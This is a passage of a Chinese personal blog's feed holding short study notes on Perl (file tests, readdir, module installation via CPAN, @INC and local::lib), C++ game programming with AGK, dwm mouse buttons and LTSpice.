    <content type="html"><![CDATA[<h1 id="chdir-的默认参数"><a href="#chdir-的默认参数" class="headerlink" title="chdir 的默认参数"></a>chdir 的默认参数</h1><p><code>chdir</code> 默认为用户的家目录.</p><h1 id="s-file"><a href="#s-file" class="headerlink" title="-s $file"></a>-s $file</h1><p>其在标量上下文中返回文件的大小 (用多少比特的形式).</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $size = -s <span class="hljs-string">&quot;~/.zshrc&quot;</span>;<br><span class="hljs-keyword">print</span> $size;<br></code></pre></td></tr></table></figure><h1 id="在命令行检查语法错误"><a href="#在命令行检查语法错误" class="headerlink" title="在命令行检查语法错误"></a>在命令行检查语法错误</h1><p>使用 <code>perl -c</code>, <code>-c</code> 是 check.</p><h1 id="当前运行的-perl-文件"><a href="#当前运行的-perl-文件" class="headerlink" title="当前运行的 perl 文件"></a>当前运行的 perl 文件</h1><p>其值保存在 <code>$0</code> 中.</p><h1 id="使用-perldoc-查看-perl-关键词"><a href="#使用-perldoc-查看-perl-关键词" class="headerlink" title="使用 perldoc 查看 perl 关键词"></a>使用 perldoc 查看 perl 关键词</h1><p>使用 <code>-f</code> 参数，如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perldoc -f our<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-dwm-statuscmd-关于鼠标的信号</title>
    <link href="/2022/10/27/%E5%85%B3%E4%BA%8E-dwm-statuscmd-%E5%85%B3%E4%BA%8E%E9%BC%A0%E6%A0%87%E7%9A%84%E4%BF%A1%E5%8F%B7/"/>
    <url>/2022/10/27/%E5%85%B3%E4%BA%8E-dwm-statuscmd-%E5%85%B3%E4%BA%8E%E9%BC%A0%E6%A0%87%E7%9A%84%E4%BF%A1%E5%8F%B7/</url>
    
    <content type="html"><![CDATA[<p>Button1 是鼠标左键点击.</p><p>Button2 是鼠标中键点击.</p><p>Button3 是鼠标右键点击.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>C++ 游戏与图形编程</title>
    <link href="/2022/10/26/C++%20%E6%B8%B8%E6%88%8F%E4%B8%8E%E5%9B%BE%E5%BD%A2%E7%BC%96%E7%A8%8B/"/>
    <url>/2022/10/26/C++%20%E6%B8%B8%E6%88%8F%E4%B8%8E%E5%9B%BE%E5%BD%A2%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="第2章"><a href="#第2章" class="headerlink" title="第2章"></a>第2章</h1><p><code>endl</code> (end line) 操作符, 可用于要求换行.</p><p>任何要用 <code>cout</code> 显示输出的程序都必须包含 <code>iostream</code> 头文件.</p><h2 id="2-5-读取键盘输入"><a href="#2-5-读取键盘输入" class="headerlink" title="2.5 读取键盘输入"></a>2.5 读取键盘输入</h2><p>用 <code>cin</code>.</p><h2 id="2-9-标准库的数学函数"><a href="#2-9-标准库的数学函数" class="headerlink" title="2.9 标准库的数学函数"></a>2.9 标准库的数学函数</h2><p>如:<br><img src="/../img/C++_math.jpg"></p><h2 id="2-10-使用字符串"><a href="#2-10-使用字符串" class="headerlink" title="2.10 使用字符串"></a>2.10 使用字符串</h2><p>使用标准库的 string 类来创建能容纳字符串的对象.</p><p>需要包含 <code>string</code> 头文件.</p><h1 id="第3章"><a href="#第3章" class="headerlink" title="第3章"></a>第3章</h1><h2 id="3-8-比较字符串"><a href="#3-8-比较字符串" class="headerlink" title="3.8 比较字符串"></a>3.8 比较字符串</h2><p>用 <code>==</code> 和 <code>!=</code>.</p><h1 id="第5章"><a href="#第5章" class="headerlink" title="第5章"></a>第5章</h1><h3 id="5-6-2-bool-函数"><a href="#5-6-2-bool-函数" class="headerlink" title="5.6.2 bool 函数"></a>5.6.2 bool 函数</h3><p>bool 函数返回 true 或 false.</p><h2 id="5-7-调用-string-类的成员函数"><a href="#5-7-调用-string-类的成员函数" class="headerlink" title="5.7 调用 string 类的成员函数"></a>5.7 调用 string 类的成员函数</h2><p>使用 <code>length()</code> 成员函数可以知道长度.</p><h1 id="第7章"><a href="#第7章" class="headerlink" title="第7章"></a>第7章</h1><h3 id="7-1-2-app-Loop-函数是自动循环的"><a href="#7-1-2-app-Loop-函数是自动循环的" class="headerlink" title="7.1.2 app::Loop 函数是自动循环的"></a>7.1.2 app::Loop 函数是自动循环的</h3><p>AGK 程序的 <code>app::Loop</code> 函数是自动重复执行的. 放到 <code>app::Loop</code> 函数中的语句会一直执行, 知道游戏结束或用户终止程序.</p><h2 id="7-3-显示精灵"><a href="#7-3-显示精灵" class="headerlink" title="7.3 显示精灵"></a>7.3 显示精灵</h2><h3 id="7-3-1-位图图像"><a href="#7-3-1-位图图像" class="headerlink" title="7.3.1 位图图像"></a>7.3.1 位图图像</h3><p>磁盘上存储的图像一般是位图格式, 位图是对图像中的每个像素都进行描述的一组数据. 在磁盘上存储位图文件时, 文件中包含每个像素的描述数据.</p><h3 id="7-3-2-精灵"><a href="#7-3-2-精灵" class="headerlink" title="7.3.2 精灵"></a>7.3.2 精灵</h3><p>电脑游戏显示的图像通常称为精灵 (sprite).</p><p>AGK 程序用 agk::CreateSprite 函数创建精灵.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">agk::<span class="hljs-built_in">CreateSprite</span>( SpriteIndex , ImageFile );<br></code></pre></td></tr></table></figure><p>这两个参数:</p><ul><li><code>SpriteIndex</code> 是精灵索引, 是在程序中标识精灵的编号, 范围在 1 到 4294967295 之间. 一旦创建精灵, 后续操作就用这个编号来识别它.</li><li><code>ImageFile</code> 是包含图的文件名, 可以是 <code>.png</code>, <code>.jpg</code>, 或 <code>.bmp</code> 格式</li></ul><p>精灵的默认位置是左上角 <code>(0,0)</code>.</p><h3 id="7-3-4-理解后台缓冲区和同步"><a href="#7-3-4-理解后台缓冲区和同步" class="headerlink" title="7.3.4 理解后台缓冲区和同步"></a>7.3.4 理解后台缓冲区和同步</h3><p><code>agk::Sync</code> 函数要在 <code>app::Loop</code> 函数中调用, 而且一般是 <code>app::Loop</code> 中执行的最后一个操作.</p>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>在-Linux-上下载-AGK-C++-库</title>
    <link href="/2022/10/26/%E5%9C%A8-Linux-%E4%B8%8A%E4%B8%8B%E8%BD%BD-AGK-C++-%E5%BA%93/"/>
    <url>/2022/10/26/%E5%9C%A8-Linux-%E4%B8%8A%E4%B8%8B%E8%BD%BD-AGK-C++-%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<p>用 <code>wget</code> 下载:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ wget http://fstore.thegamecreators.com/AppGameKit/AppGameKit-Trial-Linux.7z<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ltspice-查看各个点的电势和电流</title>
    <link href="/2022/10/26/ltspice-%E6%9F%A5%E7%9C%8B%E5%90%84%E4%B8%AA%E7%82%B9%E7%9A%84%E7%94%B5%E5%8A%BF%E5%92%8C%E7%94%B5%E6%B5%81/"/>
    <url>/2022/10/26/ltspice-%E6%9F%A5%E7%9C%8B%E5%90%84%E4%B8%AA%E7%82%B9%E7%9A%84%E7%94%B5%E5%8A%BF%E5%92%8C%E7%94%B5%E6%B5%81/</url>
    
    <content type="html"><![CDATA[<p>首先需要删除之前设定的 <code>run</code> 的参数, 用剪刀剪掉即可, 然后点击 <code>run</code>, 选择最后的 <code>DC op pnt</code> 即可.</p>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-自带的手册</title>
    <link href="/2022/10/26/Perl-%E8%87%AA%E5%B8%A6%E7%9A%84%E6%89%8B%E5%86%8C/"/>
    <url>/2022/10/26/Perl-%E8%87%AA%E5%B8%A6%E7%9A%84%E6%89%8B%E5%86%8C/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/u011729865/article/details/52680236">参考</a></p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-中的-readdir</title>
    <link href="/2022/10/25/Perl-%E4%B8%AD%E7%9A%84-readdir/"/>
    <url>/2022/10/25/Perl-%E4%B8%AD%E7%9A%84-readdir/</url>
    
    <content type="html"><![CDATA[<p>具体可查看 <code>perlfunc</code> 中的内容.</p><p>在列表上下文中返回目录下的全部内容, 在标量上下文可以通过 <code>while</code> 循环来获取全部内容:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">while</span> (<span class="hljs-keyword">my</span> $content = <span class="hljs-keyword">readdir</span> $dh) &#123;<br>    <span class="hljs-keyword">print</span> $content;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-中关于-grep-和-map-的配合使用</title>
    <link href="/2022/10/25/Perl-%E4%B8%AD%E5%85%B3%E4%BA%8E-grep-%E5%92%8C-map-%E7%9A%84%E9%85%8D%E5%90%88%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/25/Perl-%E4%B8%AD%E5%85%B3%E4%BA%8E-grep-%E5%92%8C-map-%E7%9A%84%E9%85%8D%E5%90%88%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>可以将 <code>grep</code> 的结果直接作为 <code>map</code> 的输入使用:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @dir_hs = <span class="hljs-keyword">map</span> &#123; <span class="hljs-keyword">opendir</span> <span class="hljs-keyword">my</span> $dh, $_; $dh &#125; <span class="hljs-keyword">grep</span> &#123; -d &#125; @ARGV;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-Perl-中对于句柄的检查</title>
    <link href="/2022/10/25/%E5%85%B3%E4%BA%8E-Perl-%E4%B8%AD%E5%AF%B9%E4%BA%8E%E5%8F%A5%E6%9F%84%E7%9A%84%E6%A3%80%E6%9F%A5/"/>
    <url>/2022/10/25/%E5%85%B3%E4%BA%8E-Perl-%E4%B8%AD%E5%AF%B9%E4%BA%8E%E5%8F%A5%E6%9F%84%E7%9A%84%E6%A3%80%E6%9F%A5/</url>
    
    <content type="html"><![CDATA[<p>在使用 <code>opendir</code> 时, 需要检查其是否为目录:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @not_dirs = <span class="hljs-keyword">grep</span> &#123; ! -d &#125; @ARGV;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-判断一个哈希键值对是否存在并添加</title>
    <link href="/2022/10/25/Perl-%E5%88%A4%E6%96%AD%E4%B8%80%E4%B8%AA%E5%93%88%E5%B8%8C%E9%94%AE%E5%80%BC%E5%AF%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%B9%B6%E6%B7%BB%E5%8A%A0/"/>
    <url>/2022/10/25/Perl-%E5%88%A4%E6%96%AD%E4%B8%80%E4%B8%AA%E5%93%88%E5%B8%8C%E9%94%AE%E5%80%BC%E5%AF%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%B9%B6%E6%B7%BB%E5%8A%A0/</url>
    
    <content type="html"><![CDATA[<p>常常这样判断, 并添加没有的键值对:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">unless</span> ( $output_handles&#123;$name&#125; ) &#123;<br>    <span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $fh, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&quot;$name.info&quot;</span><br>        <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Cannot create $name.info: $!&quot;</span>;<br>    $output_handles&#123;$name&#125; = $fh;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>获取-Perl-中-localtime-中的某个值</title>
    <link href="/2022/10/25/%E8%8E%B7%E5%8F%96-Perl-%E4%B8%AD-localtime-%E4%B8%AD%E7%9A%84%E6%9F%90%E4%B8%AA%E5%80%BC/"/>
    <url>/2022/10/25/%E8%8E%B7%E5%8F%96-Perl-%E4%B8%AD-localtime-%E4%B8%AD%E7%9A%84%E6%9F%90%E4%B8%AA%E5%80%BC/</url>
    
    <content type="html"><![CDATA[<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$day_of_week = (<span class="hljs-keyword">localtime</span>)[<span class="hljs-number">6</span>];<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-中的-our-my-local-和-state</title>
    <link href="/2022/10/24/Perl-%E4%B8%AD%E7%9A%84-our-my-local-%E5%92%8C-state/"/>
    <url>/2022/10/24/Perl-%E4%B8%AD%E7%9A%84-our-my-local-%E5%92%8C-state/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-Perl-的工作目录</title>
    <link href="/2022/10/23/%E5%85%B3%E4%BA%8E-Perl-%E7%9A%84%E5%B7%A5%E4%BD%9C%E7%9B%AE%E5%BD%95/"/>
    <url>/2022/10/23/%E5%85%B3%E4%BA%8E-Perl-%E7%9A%84%E5%B7%A5%E4%BD%9C%E7%9B%AE%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>似乎是你在哪个目录下执行这个程序, 默认的工作目录就是哪里.</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-Perl-从文件句柄中获取内容</title>
    <link href="/2022/10/22/%E5%85%B3%E4%BA%8E-Perl-%E4%BB%8E%E6%96%87%E4%BB%B6%E5%8F%A5%E6%9F%84%E4%B8%AD%E8%8E%B7%E5%8F%96%E5%86%85%E5%AE%B9/"/>
    <url>/2022/10/22/%E5%85%B3%E4%BA%8E-Perl-%E4%BB%8E%E6%96%87%E4%BB%B6%E5%8F%A5%E6%9F%84%E4%B8%AD%E8%8E%B7%E5%8F%96%E5%86%85%E5%AE%B9/</url>
    
    <content type="html"><![CDATA[<p>不管是从标准输入还是从文件中获取, perl 都不会自动去除换行符.</p><p>要判断输入为空时退出, 需要用到 <code>chomp()</code> 来去除换行符.</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-Perl-的-File::Spec-模块</title>
    <link href="/2022/10/20/%E5%85%B3%E4%BA%8E-Perl-%E7%9A%84-File::Spec-%E6%A8%A1%E5%9D%97/"/>
    <url>/2022/10/20/%E5%85%B3%E4%BA%8E-Perl-%E7%9A%84-File::Spec-%E6%A8%A1%E5%9D%97/</url>
    
    <content type="html"><![CDATA[<p>File::Spec 模块是 object oriented.</p><p>主要有连接多个名称为一个 full path 的方法.</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-进阶-Notes</title>
    <link href="/2022/10/20/Perl-%E8%BF%9B%E9%98%B6-Notes/"/>
    <url>/2022/10/20/Perl-%E8%BF%9B%E9%98%B6-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章-简介"><a href="#第一章-简介" class="headerlink" title="第一章 简介"></a>第一章 简介</h1><p>申请 PAUSE 账户, <a href="https://pause.perl.org/pause/authenquery?ACTION=request_id">此链接</a></p><p>使用 <code>use</code> 指定版本时, 小数点之后需要有三个数字, 如:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> <span class="hljs-number">5.014</span>;<br></code></pre></td></tr></table></figure><p>也可以使用两个小数点的形式:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">14.2</span>;<br></code></pre></td></tr></table></figure><p>or:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> <span class="hljs-number">5.14</span>.<span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p><a href="http://learn.perl.org/">在线 Perl 社区</a></p><h1 id="第二章-使用模块"><a href="#第二章-使用模块" class="headerlink" title="第二章 使用模块"></a>第二章 使用模块</h1><p>CPAN (Comprehensice Perl Archive Network). 有三个相关页面:</p><ul><li><a href="http://www.cpan.org/">主页</a></li><li><a href="http://search.cpan.org/">搜索界面</a></li><li><a href="https://www.metacpan.org/">MetaCPAN</a></li></ul><h2 id="2-1-标准发行版"><a href="#2-1-标准发行版" class="headerlink" title="2.1 标准发行版"></a>2.1 标准发行版</h2><p>使用 <code>Module::CoreList</code> 模块可以查看不同 Perl 版本中自带的模块的信息.</p><p>Perl 安装时自带的模块被称为 “核心模块”, 或 “标准发行版”.</p><h2 id="2-2-探讨-CPAN"><a href="#2-2-探讨-CPAN" class="headerlink" title="2.2 探讨 CPAN"></a>2.2 探讨 CPAN</h2><p>介绍了很多网站, 具体看书.</p><h2 id="2-3-使用模块"><a href="#2-3-使用模块" class="headerlink" title="2.3 使用模块"></a>2.3 使用模块</h2><p>可以访问, <a href="http://perldoc.perl.org/">此网站</a>, 以 HTML 格式或者 PDF 格式读取 Perl 一些版本的文档.</p><p>或者直接用 <code>perldoc</code> 命令直接查看.</p><h2 id="2-4-功能接口"><a href="#2-4-功能接口" class="headerlink" title="2.4 功能接口"></a>2.4 功能接口</h2><h3 id="选择需要导入的内容"><a href="#选择需要导入的内容" class="headerlink" title="选择需要导入的内容"></a>选择需要导入的内容</h3><p>在模块名之后指定一个子例程列表, 称导入列表:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> File::Basename (<span class="hljs-string">&#x27;fileparse&#x27;</span>, <span class="hljs-string">&#x27;basename&#x27;</span>);<br></code></pre></td></tr></table></figure><p>更常见的写法:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> File::Basename qe( fileparse basename );<br></code></pre></td></tr></table></figure><p>即使导入列表中仅有一项, 我们仍然倾向于将该项写入 <code>qw()</code> 列表, 使程序一致性更好并且易于维护.</p><p>在调用子例程时, 我们不需要在前面添加 “&amp;” 符号, 这是因为编译器已经通过 <code>use</code> 语句知道子例程的名称.</p><h2 id="2-5-面向对象的接口"><a href="#2-5-面向对象的接口" class="headerlink" title="2.5 面向对象的接口"></a>2.5 面向对象的接口</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> File::Spec;<br><br><span class="hljs-keyword">my</span> $filespec = File::Spec-&gt;catfile( $homedir<span class="hljs-string">&#123;gilligan&#125;</span>, <span class="hljs-string">&#x27;web_docs&#x27;</span>, <span class="hljs-string">&#x27;photos&#x27;</span>, <span class="hljs-string">&#x27;USS_Minnow.gif&#x27;</span> );<br></code></pre></td></tr></table></figure><p>调用 <code>File::Spec</code> 的 <code>catfile</code> 类方法. 该方法为本地操作系统创建一个合适的路径, 并且返回单个字符串.</p><h3 id="2-5-1-一个更典型的面向对象模块-Math-BigInt"><a href="#2-5-1-一个更典型的面向对象模块-Math-BigInt" class="headerlink" title="2.5.1 一个更典型的面向对象模块: Math::BigInt"></a>2.5.1 一个更典型的面向对象模块: Math::BigInt</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Math::BigInt;<br><br><span class="hljs-keyword">my</span> $value = Math::BigInt-&gt;new(<span class="hljs-number">2</span>); <span class="hljs-comment"># start with 2</span><br>$value-&gt;bpow(<span class="hljs-number">1000</span>); <span class="hljs-comment"># take 2**1000</span><br><span class="hljs-keyword">print</span> $value-&gt;bstr, <span class="hljs-string">&quot;\n&quot;</span>; <span class="hljs-comment"># print it out</span><br></code></pre></td></tr></table></figure><p><code>new</code> 关键词用来创建对象.</p><h3 id="2-5-2-更佳的模块输出"><a href="#2-5-2-更佳的模块输出" class="headerlink" title="2.5.2 更佳的模块输出"></a>2.5.2 更佳的模块输出</h3><p>使用 <code>Spreadsheet::WriteExcel</code> 模块.</p><h2 id="2-6-核心模块的内容"><a href="#2-6-核心模块的内容" class="headerlink" title="2.6 核心模块的内容"></a>2.6 核心模块的内容</h2><p>关于 <code>Module::CoreList</code> 模块, 见书.</p><h2 id="2-7-Perl-综合典藏网"><a href="#2-7-Perl-综合典藏网" class="headerlink" title="2.7 Perl 综合典藏网"></a>2.7 Perl 综合典藏网</h2><h2 id="2-8-通过-CPAN-安装模块"><a href="#2-8-通过-CPAN-安装模块" class="headerlink" title="2.8 通过 CPAN 安装模块"></a>2.8 通过 CPAN 安装模块</h2><p>使用 Perl 自带的 <code>cpan</code> 程序, 只需告诉 <code>cpan</code> 需要安装的模块的名称.</p><p>如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ cpan Perl::Critic<br></code></pre></td></tr></table></figure><p>若不带参数, 会启动 CPAN.pm 中的交互 shell 模式:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ cpan<br>&gt; install Perl::Tidy<br></code></pre></td></tr></table></figure><p>可使用:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perldoc cpan<br></code></pre></td></tr></table></figure><p>查阅.</p><p>另一个 CPANPLUS 模块.</p><h3 id="2-8-1-CPANminux"><a href="#2-8-1-CPANminux" class="headerlink" title="2.8.1 CPANminux"></a>2.8.1 CPANminux</h3><p>cpanm 工具.</p><h3 id="2-8-2-手动安装模块"><a href="#2-8-2-手动安装模块" class="headerlink" title="2.8.2 手动安装模块"></a>2.8.2 手动安装模块</h3><p>如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ wget ...<br>$ tar -xzf ...<br>$ <span class="hljs-built_in">cd</span> ...<br></code></pre></td></tr></table></figure><p>如果找到一个名为 Makefile.PL 的文件, 就运行这一系列编译, 测试和最终安装源代码的命令:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl Makefile.PL<br>$ make<br>$ make <span class="hljs-built_in">test</span><br>$ make install<br></code></pre></td></tr></table></figure><p>可通过配置 <code>INSTALL_BASE</code> 参数, 将该模块安装到其他路径. 可通过 <code>perl -V</code> 查看默认库目录等设定.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl Makefile.PL INSTALL_BASE=/User/home/Ginger<br></code></pre></td></tr></table></figure><p>为了使 Perl 能够在以上目录中查找所安装的模块, 可以设置 <code>PERL5LIB</code> 环境变量.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">export</span> PERL5LIB=/Users/home/Ginger<br></code></pre></td></tr></table></figure><p>也可以使用 <code>lib</code> 编译指令将模块的安装目录添加到模块的搜索路径中.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> lib <span class="hljs-string">qw(/Users/home/Ginger)</span>;<br></code></pre></td></tr></table></figure><p>如果在模块的安装目录下找到的是 Build.PL 文件而不是 Makefile.PL:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl Build.PL<br>$ perl Build<br>$ perl Build <span class="hljs-built_in">test</span><br>$ perl Build install<br></code></pre></td></tr></table></figure><p>使用的是 <code>install_base</code> 参数.</p><h2 id="2-9-适时设定路径"><a href="#2-9-适时设定路径" class="headerlink" title="2.9 适时设定路径"></a>2.9 适时设定路径</h2><p>Perl 会浏览 <code>@INC</code> (include) 数组中的目录元素以查找模块</p><p>在 <code>use</code> 执行前修改 <code>@INC</code> 数组的内容, 添加 <code>BEGIN</code> 块:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">BEGIN &#123; <span class="hljs-keyword">unshift</span> @INC, <span class="hljs-string">&#x27;/Users/gilligan/lib&#x27;</span>; &#125;<br><span class="hljs-keyword">use</span> Navigation::SearOfPants;<br></code></pre></td></tr></table></figure><p>可用 <code>lib</code> 代替:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> lib <span class="hljs-string">&#x27;/Users/gilligan/lib&#x27;</span>;<br><span class="hljs-keyword">use</span> Navigation::SearOfPants;<br></code></pre></td></tr></table></figure><p><code>lib</code> 编译指令获取一个或者多个参数, 并且将它们添加到 <code>@INC</code> 数组的起始部分.</p><p><code>use lib</code> 后面只是模块所在的目录的路径, 而不是模块的路径.</p><p><code>use lib</code> 在编译时运行.</p><p>FindBin 模块. 该模块查找脚本目录的完整路径, <code>$BIN</code> 变量是对应脚本所在目录的路径.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> FindBin <span class="hljs-string">qw( $Bin )</span>;<br></code></pre></td></tr></table></figure><h2 id="2-10-在程序外部设定路径"><a href="#2-10-在程序外部设定路径" class="headerlink" title="2.10 在程序外部设定路径"></a>2.10 在程序外部设定路径</h2><h3 id="2-10-1-使用-PERL5LIB-扩展-INC"><a href="#2-10-1-使用-PERL5LIB-扩展-INC" class="headerlink" title="2.10.1 使用 PERL5LIB 扩展 @INC"></a>2.10.1 使用 PERL5LIB 扩展 @INC</h3><p>PERL5LIB 变量能够在类 UNIX 系统中包含由冒号分割的多个目录.</p><h3 id="2-10-2-在命令行扩展-INC-目录"><a href="#2-10-2-在命令行扩展-INC-目录" class="headerlink" title="2.10.2 在命令行扩展 @INC 目录"></a>2.10.2 在命令行扩展 @INC 目录</h3><p>使用一个或多个 <code>-I</code> 选项直接调用 perl:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -I/home/skipper/perl-lib <br></code></pre></td></tr></table></figure><h2 id="2-11-local-lib"><a href="#2-11-local-lib" class="headerlink" title="2.11 local: lib"></a>2.11 local: lib</h2><p>默认情况下, CPAN 工具将新模块安装到与 perl 相同的目录.</p><p><code>local::lib</code> 模块设定多种环境变量, 其影响 CPAN 客户端安装模块的位置和 Perl 程序查找所安装的模块的位置.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -Mlocal::lib<br></code></pre></td></tr></table></figure><p>安装 <code>local::lib</code> 模块.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl Makefile.PL --bootstrap<br>$ make install<br></code></pre></td></tr></table></figure><p>可以在 CPAN 工具中使用 <code>-I</code> 选项来使用 <code>local::lib</code> 模块.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ cpan -I Set::Crossproduct<br></code></pre></td></tr></table></figure><p>其会查找你是否有默认目录的写入权限, 如果没有, 则会自动启用 